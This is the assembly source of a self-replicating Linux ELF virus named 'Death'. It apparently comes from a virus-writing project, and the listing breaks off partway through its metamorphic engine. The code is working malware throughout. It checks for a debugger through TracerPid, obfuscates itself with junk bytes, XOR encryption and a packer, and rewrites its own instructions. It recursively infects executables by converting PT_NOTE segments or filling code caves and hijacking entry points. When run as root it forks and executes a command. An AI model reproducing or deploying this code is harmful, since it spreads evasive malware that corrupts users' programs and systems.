;|-----------------------------------------------------------------------------|
;|                   _____             _   _        ____,                      |
;|                  |  __ \           | | | |      /.---|                      |
;|                  | |  | | ___  __ _| |_| |__    `    |     ___              |
;|                  | |  | |/ _ \/ _` | __| '_ \       (=\.  /-. \             |
;|                  | |__| |  __/ (_| | |_| | | |       |\/\_|"|  |            |
;|                  |_____/ \___|\__,_|\__|_| |_|       |_\ |;-|  ;            |
;|-----------------------------------------------------------------------------|
%include "death.inc"

section.text:
	global _start

; -== Optimization ==-
;-> Save bytes:
;	mov x, 1 => 5 bytes
;but:
;	push 1
;	pop x
;			=> 3 bytes
;and
;xor x, x => 3 bytes (put 0 into x)

; function parameters are always (rdi, rsi, rdx, rcx, r8, r9) in this specific
; order (make sense with syscall)

; Doc:
; https://tel.archives-ouvertes.fr/tel-00660274/document

_params:; filled for infected binaries
	length dq 0x0; length of the packed virus
	entry_inject dq 0x0; entry of the virus in file
	entry_prg dq 0x0; entry of the prg

_start:
	call _h3ll0w0rld; push addr to stack

signature db `Death version 1.0 (c)oded by lmartin - `; sw4g signature
fingerprint db `00000000:0000`, 0x0

_h3ll0w0rld:
	pop r8; pop addr from stack
	sub r8, 0x5; sub call instr
	; r8 contains the entry of the virus (for infected file cpy)
	or r8, 0x0 ; metamorph

%ifdef FSOCIETY ; get envv for execve
	pop rax; argument counter
	pop rdi; start of arguments
	lea r9, [rsp + (rax + 1) * 4]; start of envv
	push rdi
	push rax
%endif
	; Overlapping instruction:
	; http://infoscience.epfl.ch/record/167546/files/thesis.pdf
%ifdef DEBUG
	jmp .debug; avoid strace checking
%endif
	jmp .there
	and rax, -1 ; metamorph
	.here:
		db `\x41\xb9`; TRASH ; mov rax,

		push rdx
		push rcx
		lea rdi, [rel self_status]
		xor rsi, rsi; O_RDONLY
		nop
		nop
		nop
		add rsi, 0x0; metamorph

		jmp $+6
		db `\x42\x42\x42\x42`; TRASH ; 42; 42; mov rdi,

		push SYSCALL_OPEN
		nop
		pop rax
		nop
		syscall
		push rax
		pop rdi
		and rdi, -1 ; metamorph

		jmp $+4
		syscall; TRASH ;

		sub rsp, 4096

		mov rsi, rsp
		xor rdx, rdx
		add rdx, 4096

		jmp $+4
		db `\x48\x8d`; TRASH ; lea rax, rcx

		mov rax, 0; SYSCALL READ
		nop
		syscall

		jmp $+4
		db `\x48\x81`; TRASH; add

		push rdi
		push rsi
		pop rdi
		add rdi, 0x0; metamorph
		push rax
		pop rsi

		lea rdx, [rel tracer_pid]

		jmp $+4
		db `\x41\xb8`; TRASH;

		push 13
		nop
		pop rcx
		nop
		call _ft_memmem
		jmp $+4
		db `\x88\x66`; TRASH;
		jmp $+5
		db `\x58\x48\xbf`; TRASH

		pop rdi
		push rax
		mov rax, SYSCALL_CLOSE
		syscall
		pop rax
		and r15, -1 ; metamorph

		add rsp, 4096
		pop rcx
		pop rdx
		jmp .after
	.there:
		jmp .here + 2
		and r8, -1 ; metamorph
		push 8
		nop
		pop rax
		nop
	.after:

%ifdef DEBUG
	.debug:
		mov rax, 1
%endif

	cmp rax, 0x0
	jnz .sneakyboi; has to jmp on [48 31 c0] -> xor rax, rax
	jmp .happy_mix
	.code: ; so it's crypted right ? EVERYTHING IS KEEEYYY
		push rdx
		lea rdi, [rel _start]
		mov rsi, [rel entry_inject]
		sub rdi, rsi
		add rdi, 0x0; metamorph
		sub rsi, 8 * 3
		add rsi, [rel length]
		push 0x7
		nop
		pop rdx ; PROT_READ | PROT_WRITE | PROT_EXEC
		nop
		add rax, 0x0; metamorph
		mov rax, SYSCALL_MPROTECT; mprotect
		syscall; change protect from file to _eof

		lea rdi, [rel fingerprint]
		call _ft_strlen
		push rax
		pop rcx
		push rdi

		lea rdi, [rel _virus]
		mov rdx, rdi
		lea rsi, [rel _params]
		sub rdx, rsi
		mov rsi, [rel length]
		sub rsi, rdx ; length - (_virus - _params)
		add rsi, 0x0 ; metamorph
		or rdx, 0x0 ; metamorph
		pop rdx

		call _xor_encrypt

		lea rdx, [rel _h3ll0w0rld]
		mov rcx, KEY_SIZE
		call _xor_encrypt
		pop rdx
		add rdx, 0x0 ; metamorph

	jmp .ft_juggling + 5; jmp on eb 24 -> jmp .infected
	.happy_mix:
	add r15, 0x0 ; metamorph
	push 2
	nop
	pop rdi
	nop
	lea rsi, [rel debugging]
	jmp $+6
	db `\x48\xb8\x13\x37`
	push 12
	nop
	pop rdx
	nop
	or r13, 0x0 ; metamorph
	xor rax, rax
	nop
	nop
	nop
	add rax, 1
	add rax, 0x0 ; metamorph
	syscall

	jmp $+4; has to skip 2 byte of instruction next line
	db `\x48\xbf`
	push 1
	nop
	pop rdi
	nop
	mov rax, 0x0
	nop
	add rax, 60
	and rax, -1 ; metamorph
	jmp $+5
	.ft_juggling:
	db `\x48\xb8`; TRASH ; mov rax,
	db `\x42`
	syscall
	jmp .infected
	.sneakyboi:
	add r8, 0x0 ; metamorph
	mov rax, 0
	nop
	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
	jnz .code ; .xor_decrypt
	and r8, -1 ; metamorph
	; copy the prg in memory and launch it cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host

	.host:
%ifndef DEBUG
	mov rax, SYSCALL_FORK; fork
	syscall

	add rax, 0x0

	cmp rax, 0x0
	jnz _exit
%endif

	; host part
	call _make_virus_map
	add rdi, 0x0; metamorph
	call _search_dir
	and rdi, -1; metamorph
	call _munmap_virus

	jmp _exit
	.infected:
%ifndef DEBUG
		mov rax, SYSCALL_FORK; fork
		syscall

		add rax, 0x0 ; metamorph

		cmp rax, 0x0
		jz _virus
%else
		call _virus
%endif
		jmp _prg

debugging db `DEBUGGING..\n`, 0x0
self_status db `/proc/self/status`, 0x0
tracer_pid db `TracerPid:\t0\n`, 0x0

;                      v dst       v len      v key       v key_size
_xor_encrypt:; (void *rdi, size_t rsi, void *rdx, size_t rcx)
	push r8
	push r9

	xor r8, r8; i len
	nop
	nop
	nop
	.reset_key_size:
		mov r9, 0; j key_size
		nop
	.loop_bytes:
		cmp r8, rsi
		je .return
		cmp r9, rcx
		je .reset_key_size
		mov al, byte[rdx + r9]; key[j]
		xor byte[rdi + r8], al
		inc r8
		inc r9
	jmp .loop_bytes
	.return:

	pop r9
	pop r8
ret

_exit:
	push SYSCALL_EXIT
	pop rax ; exit
	add rax, 0x0 ; metamorph
	xor rdi, rdi
	nop
	nop
	nop
	and rdi, -1 ; metamorph
	syscall

_ft_memcmp: ; (void *rdi, void *rsi, size_t rdx)
	push rcx

	xor rax, rax
	nop
	nop
	nop
	xor rcx, rcx
	nop
	nop
	nop
	cmp rcx, rdx
	je .empty_return
	dec rdx
	.loop_byte:
		mov al, [rdi + rcx]
		cmp al, [rsi + rcx]
		jne .return
		cmp rcx, rdx
		je .return
		inc rcx
	jmp .loop_byte
	.return:
		sub al, [rsi + rcx]
	inc rdx
	.empty_return:

	pop rcx
ret

_ft_memmem: ; (void *rdi, size_t rsi, void *rdx, size_t rcx)
	push r8
	push rbx

	xor rax, rax
	nop
	nop
	nop
	xor r8, r8
	nop
	nop
	nop
	cmp rsi, rcx
	jl .return
	cmp rcx, 0x0
	je .return
	.loop_byte:
		xor rax, rax
		nop
		nop
		nop
		cmp r8, rsi
		je .return
		mov rbx, rdi
		add rdi, r8
		push rsi
		push rdx
		pop rsi
		push rcx
		pop rdx
		call _ft_memcmp
		push rdx
		pop rcx
		push rsi
		pop rdx
		pop rsi
		push rbx
		pop rdi
		cmp rax, 0x0
		je .found
		inc r8
	jmp .loop_byte
	.found:
		mov rax, rdi
		add rax, r8
	.return:

	pop rbx
	pop r8
ret

_ft_strlen:; (string rdi)
	xor rax, rax
	nop
	nop
	nop
	.loop_char:
		cmp byte [rdi + rax], 0
		jz .return
		inc rax
	jmp .loop_char
	.return:
ret

_virus:
	push rdx
	push r8
	push r9

	; copy the virus into a mmap executable
	xor rdi, rdi
	nop
	nop
	nop
	add rdi, 0x0; metamorph

	lea rsi, [rel _eof]
	lea r8, [rel _params]
	sub rsi, r8
	push 7
	nop
	pop rdx; PROT_READ | PROT_WRITE | PROT_EXEC
	nop
	and rdx, -1; metamorph
	push 34
	nop
	pop r10; MAP_PRIVATE | MAP_ANON
	nop
	or r15, 0x0; metamorph
	push -1
	pop r8 ; fd
	xor r9, r9; offset
	nop
	nop
	nop
	add r9, 0x0; metamorph
	mov rax, SYSCALL_MMAP; mmap
	syscall

	push rsi; save length

;		memcpy(void *dst, void *src, size_t len)
	push rax
	pop rdi ; addr
	lea rsi, [rel _params]
	lea rdx, [rel _pack_start]
	sub rdx, rsi
	or rdx, 0x0; metamorph
	call _ft_memcpy

	mov r9, rdi; save addr
	and r9, -1; metamorph
;		unpack(void *dst, void *src, size_t len)
	add rdi, rdx
	add rsi, rdx
	mov rax, [rel length]
	sub rax, rdx; length - [_pack_start - params]
	push rax
	add rax, 0x0; metamorph
	pop rdx

	call _unpack

	add r9, 0x0; metamorph

	push r9
	pop rdi
	pop rsi

	pop r9
	pop r8

	or rdi, 0x0; metamorph

	push rsi ; save length

	lea rsi, [rel _params]
	lea rax, [rel _search_dir]
	sub rax, rsi
	add rax, rdi

	and r10, -1; metamorph

	push rdi ; save addr
	push r14
	mov r14, [rel length]

	call rax ; jump to mmaped memory
	pop r14

	and r14, -1; metamorph

	pop rdi ; pop addr
	pop rsi ; pop length

	; munmap the previous exec
	mov rax, SYSCALL_MUNMAP
	syscall
	pop rdx

%ifndef DEBUG
	call _exit
%else
	ret
%endif

_prg:
	; end infected file
	or rax, 0x0; metamorph
	push r8
	pop rax


	sub rax, [rel entry_inject]
	add rax, [rel entry_prg]

	; jmp on entry_prg
	jmp rax

;                 v dst      v src       v size
_unpack:; (void *rdi, void *rsi, size_t rdx)
	push r8
	push r9
	push r10
	push r11
	push rcx

	push rdi
	pop r9
	push rsi
	pop r10
	push rdx
	pop r11

	xor rax, rax
	nop
	nop
	nop
	add rax, 0x0; metamorph
	xor rcx, rcx
	nop
	nop
	nop
	and rcx, -1; metamorph
	xor r8, r8
	nop
	nop
	nop
	add r8, 0x0; metamorph
	.loop_uncompress:
		cmp rcx, r11
		jge .end_loop
		cmp byte[r10 + rcx], MAGIC_CHAR
		je .uncompress_char
			mov al, [r10 + rcx]
			mov [r9 + r8], al
			inc rcx
			inc r8
		jmp .loop_uncompress
		.uncompress_char:
			mov rdi, r9
			add rdi, r8
			mov al, [r10 + rcx + 1]
			push rdi
			add rdi, 0x0; metamorph
			pop rsi
			sub rsi, rax
			mov al, [r10 + rcx + 2]
			push rax
			pop rdx
			call _ft_memcpy
			mov rax, 0
			nop
			add rax, 0x0; metamorph
			mov al, byte[r10 + rcx + 2]
			add r8, rax
			add rcx, 3
			and rcx, -1; metamorph
		jmp .loop_uncompress
	.end_loop:
		push r9
		pop rdi
		push r10
		pop rsi
		and rsi, -1; metamorph
		push r11
		pop rdx
		add rdx, 0x0; metamorph

	pop rcx
	pop r11
	pop r10
	pop r9
	pop r8
ret

_ft_memcpy: ; (string rdi, string rsi, size_t rdx)
	push rcx

	mov rax, rdi
	mov rcx, rdx
	push rdx
	mov rdx, rsi
	rep movsb
	push rax
	pop rdi
	push rdx
	pop rsi
	pop rdx
	mov rax, rdi

	pop rcx
ret

; packer-part till _eof --------------------------------------------------------
_pack_start:
%ifdef DEBUG
	db `pack_start`, 0x0
%endif
_search_dir:
%ifdef FSOCIETY
	push SYSCALL_GETEUID; geteuid
	pop rax
	syscall

	cmp rax, 0x0
	jne .check_process

	push SYSCALL_FORK
	pop rax; fork
	syscall

	cmp rax, 0x0
	jz .i_am_root

ret
%endif

	.check_process:
	; check for process running
	push 1
	pop rsi ; mode for move_through_dir
	lea rdi, [rel process_dir]

	call _move_through_dir

	cmp rax, 0x0
	jne .return
	push r15
	xor r15, r15
	; => Change fingerprint gettimeofday (r8 + fingerprint - _start)
		sub rsp, 16; sizeof struct timeval
		lea rdi, [rsp - 16]
		xor rsi, rsi
		push SYSCALL_GETTIMEOFDAY; gettimeofday
		pop rax
		syscall

		lea rsi, [rel fingerprint]
		lea rdi, [rel _start]
		sub rsi, rdi
		mov rdi, r8
		add rdi, rsi
		mov rsi, [rsp - 16]
		lea rax, [rel hex_nums]

		push 8
		pop rcx
		.remove_leading_zero:
			rol rsi, 4
			dec rcx
			jnz .remove_leading_zero
		push 8
		pop rcx
		.digit_loop:
			rol rsi, 4
			mov rdx, rsi
			and rdx, 0x0f
			movzx rdx, byte[rax + rdx]
			mov byte[rdi], dl
			inc rdi
			dec rcx
			jnz .digit_loop

		add rsp, 16
	;
	xor rsi, rsi ; mode for move_through_dir
	lea rdi, [rel directories]
	xor rcx, rcx; = 0
	.loop_array_string:
		add rdi, rcx
		call _ft_strlen
		push rax
		pop rcx
		call _move_through_dir
	inc rcx
	cmp byte[rdi + rcx], 0x0
	jnz .loop_array_string
	pop r15
	.return:
ret

%ifdef FSOCIETY
	.i_am_root:
		push r9
		pop rdx

		lea rdi, [rel devnull]
		push 1
		pop rsi
		push 2
		pop rax;open("/dev/null", O_WRONLY)
		syscall
		push rax
		pop rdi
		push 1
		pop rsi
		push 33
		pop rax; dup2(fd, 1)
		syscall
		push 2
		pop rsi
		push 33
		pop rax; dup2(fd, 2)
		syscall
	; let open otherwise don't work on guest
	;	mov rax, 3; close(fd)
	;	syscall

		; I am root
		xor rax, rax
		push rax; NULL
		lea rdi, [rel argv3]
		push rdi
		lea rdi, [rel argv2]
		push rdi
		lea rdi, [rel argv1]
		push rdi
		lea rdi, [rel argv0]
		push rdi

		mov rsi, rsp
		lea rdi, [rel argv0]
		push 59
		pop rax
		syscall

		add rsp, 32
		call _exit
%endif

_move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
	push r10
	push r12
	push r13
	push rbx
	push rcx
	push rdx

	push rsi
	pop r13

	push SYSCALL_OPEN
	pop rax; open
	push 0o0200000; O_RDONLY | O_DIRECTORY
	pop rsi
	syscall
	cmp rax, 0x0
	jl .return; jump lower

	push rdi
	pop r10; path

	sub rsp, 1024
	push rax
	.getdents:
		pop rdi
		push SYSCALL_GETDENTS
		pop rax; getdents
		push 1024
		pop rdx; size of buffer
		mov rsi, rsp; buffer
		syscall
		push rdi
		push rsi
		pop r12
		cmp rax, 0x0
		jle .close
		push rax
		pop rdx; nread
		xor rcx, rcx; = 0

	.loop_in_file:
		cmp rcx, rdx
		jge .getdents; rcx >= rdx
		mov rdi, r12
		add rdi, rcx; r12 => linux_dir
		; if not . .. +18
		add rdi, 18; linux_dir->d_name
		
		; ft_strcmp with '.' and '..' to not infect_dir with them
		push rcx
		lea rsi, [rel dotdir]
		xor rcx, rcx; = 0
		.loop_array_string:
			add rsi, rcx
			call _ft_strcmp
			cmp rax, 0x0
			je .next_file
			xor rcx, rcx; = 0
			.next_string:; seek next dir
				inc rcx
				cmp byte[rsi + rcx], 0x0
				jnz .next_string
		inc rcx
		cmp byte[rsi + rcx], 0x0
		jnz .loop_array_string

		; concat_path
			push rbx
			sub rsp, 4096

			push rdi
			pop rbx
			mov rdi, rsp; buffer
			mov rsi, r10
			call _ft_strcpy
			push rbx
			pop rsi
			call _ft_concat_path

		; check infect_dir or infect_file
			sub rsp, 600

			push SYSCALL_LSTAT
			pop rax ; stat
			mov rsi, rsp ; struct stat
			syscall
			cmp rax, 0x0
			jne .free_buffers

			mov rax, [rsi + ST_MODE]
			and rax, S_IFMT

			cmp r13, 0; infect
			je .infect

			; process
			cmp rax, S_IFDIR
			jne .free_buffers

			; if /proc/[nb] -> check /proc/[nb]/status
			push rdi
			push rbx
			pop rdi
			call _ft_isnum
			pop rdi
			cmp rax, 0x0
			je .free_buffers
			lea rsi, [rel process_status]
			call _ft_concat_path
			call _check_file_process
			cmp rax, 0x0
			jne .process_found

			jmp .free_buffers
			.infect:
				cmp rax, S_IFREG ; S_IFREG
				je .infect_file
				cmp rax, S_IFDIR ; S_IFDIR
				jne .free_buffers

			; infect dir
			xor rsi, rsi; infect -> 0
			call _move_through_dir
			jmp .free_buffers

		.infect_file:
			call _infect_file

		.free_buffers:
			add rsp, 4696
			pop rbx

		.next_file:
			pop rcx
			mov rsi, r12
			add rsi, rcx
			push rdi
			movzx edi, word [rsi + D_RECLEN]; linux_dir->d_reclen
			add rcx, rdi
			pop rdi
			jmp .loop_in_file

	.process_found:
		add rsp, 4696
		pop rbx
		pop rcx

	.close:
		push rax
		pop rsi
		pop rdi; fd
		push SYSCALL_CLOSE
		pop rax; close
		syscall
		push r10
		pop rdi
		add rsp, 1024
		push rsi
		pop rax

	.return:

	pop rdx
	pop rcx
	pop rbx
	pop r13
	pop r12
	pop r10
ret

_infect_file: ; (string rdi, stat rsi)
	push r10
	push r11
	push r12
	push r13
	push rbx
	push rcx
	push rdx

	push rsi
	pop r12
	push SYSCALL_OPEN
	pop rax; open
	push 0o0000002; O_RDWR
	pop rsi
	syscall
	cmp rax, 0x0
	jl .return; jump lower
	push rdi
	pop r10 ; path

	push r8
	push rax
	pop r8

	push r10
	xor rdi, rdi
	mov rsi, [r12 + ST_SIZE] ; statbuf.st_size
	push 3
	pop rdx ; PROT_READ | PROT_WRITE
	push MAP_SHARED
	pop r10 ; MAP_SHARED
	xor r9, r9
	push SYSCALL_MMAP
	pop rax ; mmap
	syscall
	pop r10
	push r8
	pop r11; fd
	pop r8
	cmp rax, 0x0
	jl .close ; < 0

	push rax
	pop rsi
	lea rdi, [rel elf_magic]
	push 5
	pop rdx
	call _ft_memcmp
	push rsi
	pop r13
	cmp rax, 0x0
	jne .unmap ; not elf 64 file

	cmp byte[rsi + ehdr.e_type], ET_EXEC ; ET_EXEC
	je .is_elf_file
	cmp byte[rsi + ehdr.e_type], ET_DYN ; ET_DYN
	jne .unmap

	.is_elf_file:
		; get pt_load exec
		xor rcx, rcx
		mov rbx, r13
		add rbx, [r13 + ehdr.e_phoff]; e_phoff
		mov ax, [r13 + ehdr.e_phnum]; e_phnum
		.find_segment_exec:
			inc rcx
			cmp rcx, rax
			jge .get_segment_note
			cmp dword[rbx], PT_LOAD ; p_type != PT_LOAD
			jne .next_segment_exec
			mov dx, [rbx + phdr.p_flags]; p_flags
			and dx, PF_X ; PF_X
			jnz .check_if_infected
			.next_segment_exec:
				mov ax, [r13 + ehdr.e_phnum]; e_phnum
				add rbx, SIZEOF(ELF64_PHDR); sizeof(Elf64_Phdr)
			jmp .find_segment_exec
; = test
		.get_segment_note:
			; get max vaddr
			xor rsi, rsi; max
			xor rcx, rcx
			mov rbx, r13
			add rbx, [r13 + ehdr.e_phoff]; e_phoff
			.find_max:
				inc rcx
				cmp rcx, rax
				jge .found_max
				mov rdx, [rbx + phdr.p_vaddr]
				add rdx, [rbx + phdr.p_memsz]
				cmp rsi, rdx
				jge .continue
				push rdx
				pop rsi
				.continue:
				add rbx, SIZEOF(ELF64_PHDR); sizeof(Elf64_Phdr)
				jmp .find_max
			.found_max:
			xor rcx, rcx
			mov rbx, r13
			add rbx, [r13 + ehdr.e_phoff]; e_phoff
		.find_segment_note:
			inc rcx
			cmp rcx, rax
			jge .unmap
			cmp dword[rbx], PT_NOTE ; p_type != PT_NOTE
			jne .next_segment_note
			; FOUND !
			; map
			push rsi
			push r8
			push r10
			xor rdi, rdi
			mov rsi, [r12 + ST_SIZE] ; statbuf.st_size
			; ADD VIRUS_SIZE
			add rsi, r14; add virus size
			push 3
			pop rdx ; PROT_READ | PROT_WRITE
			push 34
			pop r10 ; MAP_PRIVATE | MAP_ANON
			xor r9, r9
			xor r8, r8
			push r11
			push SYSCALL_MMAP
			pop rax ; mmap
			syscall
			pop r11
			pop r10
			pop r8

			mov rdi, rax
			mov rsi, r13
			mov rdx, [r12 + ST_SIZE]
			call _ft_memcpy
			pop rsi

			sub rbx, r13
			push r13
			push rax
			pop r13
			add rbx, r13
			mov dword[rbx], PT_LOAD; PT_LOAD
			mov dword[rbx + phdr.p_flags], 7; PF_X | PF_R
			mov rax, [r12 + ST_SIZE]
			mov [rbx + phdr.p_offset], rax
			xor rdx, rdx
			push 0x1000
			pop rcx
			div rcx
			push rsi
			pop rax
			div rcx
			inc rax
			mul rcx
			add rax, rdx

			mov [rbx + phdr.p_vaddr], rax
			mov [rbx + phdr.p_paddr], rax
			mov qword[rbx + phdr.p_filesz], 0x0
			mov qword[rbx + phdr.p_memsz], 0x0
			mov qword[rbx + phdr.p_align], 0x1000

			mov rdi, [r12 + ST_SIZE]
			add rdi, r13 ; addr pointer -> mmap

			mov rdx, r14

			call _infect

			; write file
			mov rdi, r11
			push r11
			mov rsi, r13
			mov rdx, [r12 + ST_SIZE] ; statbuf.st_size
			add rdx, r14
			push SYSCALL_WRITE
			pop rax
			syscall
			pop r11

			; unmap
			push r11; munmap using r11 ?
			push r13
			pop rdi
			mov rsi, [r12 + ST_SIZE] ; statbuf.st_size
			add rsi, r14
			push SYSCALL_MUNMAP
			pop rax; munmap
			syscall
			pop r11

			pop r13
			jmp .unmap
			.next_segment_note:
				add rbx, SIZEOF(ELF64_PHDR); sizeof(Elf64_Phdr)
			jmp .find_segment_note
;
		.check_if_infected:
			; TODO: check only at offset + filesz - virus_size
			lea rdx, [rel signature]
			mov rdi, [rbx + phdr.p_offset]; p_offset
			mov rax, [r12 + ST_SIZE]
			cmp rdi, rax
			jg .unmap
			push rcx
			lea rcx, [rel fingerprint]
			sub rcx, rdx
			add rdi, r13
			mov rsi, [rbx + phdr.p_filesz]; p_filesz
;			cmp rsi, rcx
;			jl .unmap
			call _ft_memmem
			pop rcx

			cmp rax, 0x0
			jne .unmap

			; check size needed
			mov rdi, [rbx + phdr.p_offset]
			add rdi, rsi; p_offset + p_filesz
			mov rsi, [rbx + SIZEOF(ELF64_PHDR) + phdr.p_offset] ; next->p_offset
			sub rsi, rdi

			add rdi, r13 ; addr pointer -> mmap

			xor r9, r9
			cmp rsi, r14
			jl .next_segment_exec ; if size between PT_LOAD isn't enough, search another segment
			mov rdx, r14

			call _infect

	.unmap:
		push r11; munmap using r11 ?
		push r13
		pop rdi
		mov rsi, [r12 + ST_SIZE] ; statbuf.st_size
		push SYSCALL_MUNMAP
		pop rax; munmap
		syscall
		pop r11
	.close:
		push r11
		pop rdi
		push SYSCALL_CLOSE
		pop rax; close
		syscall
	.return:
		push r10
		pop rdi
		push r12
		pop rsi

	pop rdx
	pop rcx
	pop rbx
	pop r13
	pop r12
	pop r11
	pop r10
ret

_infect:
	push rcx
	; => Change fingerprint (r8 + fingerprint - _start)
		push rdi
		push rdx
		inc r15
		lea rsi, [rel fingerprint + 9]
		lea rdi, [rel _start]
		sub rsi, rdi
		mov rdi, r8
		add rdi, rsi
		mov rsi, r15
		lea rax, [rel hex_nums]

		push 12
		pop rcx
		.remove_leading_zero:
			rol rsi, 4
			dec rcx
			jnz .remove_leading_zero
		push 4
		pop rcx
		.digit_loop:
			rol rsi, 4
			mov rdx, rsi
			and rdx, 0x0f
			movzx rdx, byte[rax + rdx]
			mov byte[rdi], dl
			inc rdi
			dec rcx
			jnz .digit_loop
		pop rdx
		pop rdi

;				lea rsi, [rel fingerprint]
;				lea rcx, [rel _start]
;				sub rsi, rcx
;				mov rcx, r8
;				add rcx, rsi
;				inc byte[rcx]
	;
	push 8 * 3
	pop rcx

	push rdi
	mov rdi, r8
	call _metamorph
	pop rdi

	sub rdx, rcx
	; copy virus
	add rdi, rcx
	mov rsi, r8
	call _ft_memcpy
	mov rax, rdi
	add rdx, rcx
	sub rax, rcx

	push rdi
	; change fingerprint
	lea rdi, [rel _params]
	lea rcx, [rel fingerprint]
	sub rcx, rdi
	mov rdi, rax
	add rdi, rcx
	push rax
	call _update_fingerprint
	pop rax
	push rdi

	mov rdi, rax
	push rax
	lea rcx, [rel _virus]
	lea rsi, [rel _params]
	sub rcx, rsi
	add rdi, rcx
	mov rsi, rdx; [rel length]
	push rdx
	sub rsi, rcx ; length - (_virus - _params)
	lea rdx, [rel _h3ll0w0rld]
	sub rdx, rcx
	add rdx, rdi
	lea rcx, [rel _params]
	sub rdx, rcx
	mov rcx, KEY_SIZE
	call _xor_encrypt

	pop rcx
	pop rax
	pop rdx
	push rax
	push rcx

	push rdi
	lea rdi, [rel fingerprint]
	call _ft_strlen

	lea rdi, [rel _params]
	lea rcx, [rel fingerprint]
	sub rcx, rdi
	mov rdi, rax
	add rdi, rcx

	push rax
	pop rcx
	pop rdi

	call _xor_encrypt

	pop rdx
	pop rax

	pop rdi
	pop rcx

	; add _params
	mov [rax], rdx ; length
	add rax, 8
	sub rdi, r13
	; copy mapped 'padding' like 0x400000
	mov rsi, rdi
	add rsi, [rbx + phdr.p_vaddr]; p_vaddr
	sub rsi, [rbx + phdr.p_offset]; p_offset
	mov [rax], rsi ; entry_inject
	add rax, 8
	mov rsi, [r13 + ehdr.e_entry]; entry_prg
	mov [rax], rsi

	; change entry
	; copy mapped 'padding' like 0x400000
	add rdi, [rbx + phdr.p_vaddr]; vaddr
	sub rdi, [rbx + phdr.p_offset]; p_offset
	mov [r13 + ehdr.e_entry], rdi ; new_entry

	; change pt_load size
	add [rbx + phdr.p_filesz], rdx; p_filesz + virus
	add [rbx + phdr.p_memsz], rdx; p_memsz + virus
ret

; I'm a pokemon
_metamorph:; (rdi -> ptr)
	push r8
	push r9
	push r11
	push rsi
	push rcx
	push rdx
	; xor_encrypt
	; swap registry r8, r9 -> r9, r10 -> ... -> r14, r15 -> r8, r9 -> ...

	lea rax, [rel _params]
	lea rsi, [rel _exit]
	lea rcx, [rel _xor_encrypt]
	sub rsi, rcx
	sub rcx, rax
	sub rdi, 8 * 3
	mov rax, rdi
	push rax
	add rdi, rcx
	xor rcx, rcx
	cmp byte[rdi + 1], 0x56
	je .reset_metamorph_xor_encrypt
	.metamorph_xor_encrypt: ; (rdi ptr, rsi len)
		cmp rcx, rsi
		jge .break
		cmp byte[rdi + rcx], 0x41
		je .push
		cmp byte[rdi + rcx], 0x4d
		je .xor
		cmp byte[rdi + rcx], 0x49
		je .cmp
		cmp byte[rdi + rcx], 0x42
		je .mov_xor_byte
		cmp byte[rdi + rcx], 0x4c
		je .add_left
		jmp .continue
		.push:
			inc rcx
			inc byte[rdi + rcx]
			jmp .continue
		.xor:
			add rcx, 2
			add byte[rdi + rcx], 9
			jmp .continue
		.cmp:
			add rcx, 2
			inc byte[rdi + rcx]
			jmp .continue
		.mov_xor_byte:
			add rcx, 3
			add byte[rdi + rcx], 8
			jmp .continue
		.add_left:
			add rcx, 2
			add byte[rdi + rcx], 8
		.continue:
		inc rcx
	jmp .metamorph_xor_encrypt
	.reset_metamorph_xor_encrypt: ; (rdi ptr, rsi len)
		cmp rcx, rsi
		jge .break
		cmp byte[rdi + rcx], 0x41
		je .push_reset
		cmp byte[rdi + rcx], 0x4d
		je .xor_reset
		cmp byte[rdi + rcx], 0x49
		je .cmp_reset
		cmp byte[rdi + rcx], 0x42
		je .mov_xor_byte_reset
		jmp .continue_reset
		.push_reset:
			inc rcx
			sub byte[rdi + rcx], 6
			jmp .continue_reset
		.xor_reset:
			add rcx, 2
			sub byte[rdi + rcx], 9 * 6
			jmp .continue_reset
		.cmp_reset:
			add rcx, 2
			sub byte[rdi + rcx], 6
			jmp .continue_reset
		.mov_xor_byte_reset:
			add rcx, 3
			sub byte[rdi + rcx], 8 * 6
		.continue_reset:
		inc rcx
	jmp .reset_metamorph_xor_encrypt
	.break:
	pop rax
	; normal registry 64
	; mov rax, 0; nop -> X 0 0 0 0 90
	; xor rax, rax nop nop nop -> 48 31 X 90 90 90
	; special registry 
	; mov r8, 0; nop -> 41 X 0 0 0 0
	; xor r8, r8; nop nop nop -> 4d 31 X 90 90 90
	mov rdi, rax
	push rax
	lea rsi, [rel _pack_start]
	lea rax, [rel _params]
	sub rsi, rax
	lea rcx, [rel _h3ll0w0rld]
	sub rcx, rax
	add rdi, rcx
	xor rcx, rcx
	.substitute_instruction:
		cmp rcx, rsi
		jge .end_substitute_instruction
		mov rax, rdi
		push rax
		add rdi, rcx
		push rsi
		cmp word[rdi], `\x48\x31` ; xor rXX, rXX
		je .swap_instruction_pattern_a
		cmp word[rdi], `\x4d\x31`; xor rY, rY (Y=8..15)
		je .swap_instruction_pattern_b
		cmp dword[rdi + 1], `\x00\x00\x00\x00`; mov rXX, 0
		je .swap_instruction_pattern_c
		cmp byte[rdi], 0x41; mov rY, 0
		je .swap_instruction_pattern_d
		cmp byte[rdi], 0x6a; push N pop rXX
		je .swap_instruction_pattern_e
		xor rdx, rdx
		mov dl, byte[rdi]
		and dl, 0xb0; mov RXX, N
		cmp dl, 0xb0
		jz .swap_instruction_pattern_f
		cmp word[rdi], `\xeb\x02`
		je .swap_instruction_pattern_g
		cmp word[rdi], `\x48\x83`
		je .swap_instruction_pattern_h
		cmp word[rdi], `\x49\x83`
		je .swap_instruction_pattern_h
		jmp .inc_rcx
		.swap_instruction_pattern_a:; xor rax, rax; nop; nop; nop-> mov rax, 0; nop
			cmp byte[rdi + 3], 0x90
			jne .inc_rcx
			cmp word[rdi + 4], 0x9090
			jne .inc_rcx
			push rdi
			mov rdi, 2
			call _rand_modulo
			pop rdi
			cmp rax, 0x0
			je .inc_rcx
			mov rdx, rdi
			push rdi
			push rcx
			lea rdi, [rel swap_registry]
			mov rsi, 16
			add rdx, 2
			mov rcx, 1
			call _ft_memmem
			pop rcx
			pop rdi
			cmp rax, 0x0
			je .inc_rcx
			inc rax
			xor rdx, rdx
			mov dl, byte[rax]
			mov byte[rdi], dl
			mov dword[rdi + 1], 0x00000000
			add rcx, 5
			jmp .inc_rcx
		.swap_instruction_pattern_b:; xor r8, r8; nop; nop; nop -> mov r8, 0
			cmp byte[rdi + 3], 0x90
			jne .inc_rcx
			cmp word[rdi + 4], 0x9090
			jne .inc_rcx
			push rdi
			mov rdi, 2
			call _rand_modulo
